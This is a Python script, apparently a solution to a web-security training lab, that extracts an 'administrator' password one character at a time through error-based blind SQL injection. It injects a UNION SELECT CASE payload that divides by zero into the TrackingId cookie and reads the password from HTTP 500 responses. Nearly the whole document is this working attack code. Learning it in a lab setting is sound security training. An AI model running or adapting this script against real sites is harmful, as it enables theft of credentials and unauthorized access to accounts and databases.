import requests
import string

# Author : 0x2nac0nda

# Character set including lowercase, uppercase letters, and digits
base = string.ascii_lowercase + string.ascii_uppercase + string.digits

# Initialize the password
p = ""

# Create a session
session = requests.Session()

# Common headers for the requests
headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Referer": "https://ac4a1f101ede3b5d8069192400cf0045.web-security-academy.net/",
    "Connection": "close",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate"
}

# Common GET parameters
paramsGet = {"category": "Pets"}

# Base URL
url = "https://0a65006104f7280481f5edb9005c0027.web-security-academy.net/"

# Iterate over each character position of the password
for i in range(1, 21):
    for c in base:
        # Set the cookie for SQL injection
        cookies = {
            "TrackingId": f"' UNION SELECT CASE WHEN (username='administrator' AND substr(password,{i},1)='{c}') THEN to_char(1/0) ELSE NULL END FROM users -- -",
            "session": "DRqjL1RO6ogyJu9dpYWzOCuJhAmebrKV"
        }

        try:
            # Make the request
            response = session.get(url, params=paramsGet, headers=headers, cookies=cookies)
            if response.status_code == 500:
                p += c
                print(p)
                break
        except requests.RequestException as e:
            print(f"An error occurred: {e}")
            continue

# Final password
print(f"Password: {p}")
